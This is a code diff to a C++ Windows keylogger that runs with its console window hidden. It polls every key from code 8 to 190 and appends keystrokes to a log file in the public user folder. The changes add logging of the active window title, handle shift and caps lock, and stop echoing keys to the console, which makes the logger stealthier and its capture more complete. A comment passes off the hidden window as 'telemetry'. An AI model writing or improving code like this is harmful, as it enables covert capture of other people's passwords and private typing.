@@ -10,6 +10,9 @@
 
 using namespace std;
 
+// Forward Declaration
+string GetActiveWindowTitle();
+
 void LOG(string input)
 {
     fstream LogFile;
@@ -26,87 +29,110 @@ bool SpecialKeys(int S_Key)
     switch (S_Key)
     {
     case VK_SPACE:
-        cout << " ";
         LOG(" ");
         return true;
     case VK_RETURN:
-        cout << "\n";
         LOG("\n");
         return true;
-    case '¾':
-        cout << ".";
+    case VK_OEM_PERIOD:
         LOG(".");
         return true;
+    case VK_OEM_MINUS:
+        LOG("-");
+        return true;
     case VK_SHIFT:
-        cout << "#SHIFT#";
         LOG("#SHIFT#");
         return true;
     case VK_BACK:
-        cout << "\b";
-        LOG("\b");
+        LOG("[BACKSPACE]");
         return true;
     case VK_RBUTTON:
-        cout << "#R_CLICK#";
         LOG("#R_CLICK#");
         return true;
     case VK_CAPITAL:
-        cout << "#CAPS_LOCK#";
-        LOG("#CAPS_LCOK");
+        LOG("#CAPS_LOCK#");
         return true;
     case VK_TAB:
-        cout << "#TAB";
-        LOG("#TAB");
+        LOG("#TAB#");
         return true;
     case VK_UP:
-        cout << "#UP";
-        LOG("#UP_ARROW_KEY");
+        LOG("#UP_ARROW_KEY#");
         return true;
     case VK_DOWN:
-        cout << "#DOWN";
-        LOG("#DOWN_ARROW_KEY");
+        LOG("#DOWN_ARROW_KEY#");
         return true;
     case VK_LEFT:
-        cout << "#LEFT";
-        LOG("#LEFT_ARROW_KEY");
+        LOG("#LEFT_ARROW_KEY#");
         return true;
     case VK_RIGHT:
-        cout << "#RIGHT";
-        LOG("#RIGHT_ARROW_KEY");
+        LOG("#RIGHT_ARROW_KEY#");
         return true;
     case VK_CONTROL:
-        cout << "#CONTROL";
-        LOG("#CONTROL");
+        LOG("#CONTROL#");
         return true;
     case VK_MENU:
-        cout << "#ALT";
-        LOG("#ALT");
+        LOG("#ALT#");
         return true;
     default:
         return false;
     }
 }
 
+string GetActiveWindowTitle()
+{
+    char windowTitle[256];
+    // Corrected to use native HWND definition
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd != NULL)
+    {
+        int length = GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
+        if (length > 0)
+        {
+            return string(windowTitle);
+        }
+    }
+    return "Unknown Window";
+}
+
 int main()
 {
+    // Hide native prompt frame during baseline telemetry phase
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    char KEY = 'x';
+
+    string currentWindow = "";
 
     while (true)
     {
         Sleep(10);
+
+        string activeWindow = GetActiveWindowTitle();
+
+        // Trace window boundary focus shifting
+        if (activeWindow != currentWindow)
+        {
+            currentWindow = activeWindow;
+            LOG("\n\n### Window: " + currentWindow + " ###\n");
+        }
+
         for (int KEY = 8; KEY <= 190; KEY++)
         {
             if (GetAsyncKeyState(KEY) == -32767)
             {
                 if (SpecialKeys(KEY) == false)
                 {
-
-                    fstream LogFile;
-                    LogFile.open("C:\\Users\\Public\\A04_1b_polling_keylog.txt", fstream::app);
-                    if (LogFile.is_open())
+                    if ((KEY >= 'A' && KEY <= 'Z') || (KEY >= '0' && KEY <= '9'))
                     {
-                        LogFile << char(KEY);
-                        LogFile.close();
+                        bool isShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                        bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+                        char outChar = char(KEY);
+                        if (!(isShift ^ isCaps) && (KEY >= 'A' && KEY <= 'Z'))
+                        {
+                            outChar = tolower(outChar);
+                        }
+
+                        string outputStr(1, outChar);
+                        LOG(outputStr);
                     }
                 }
             }
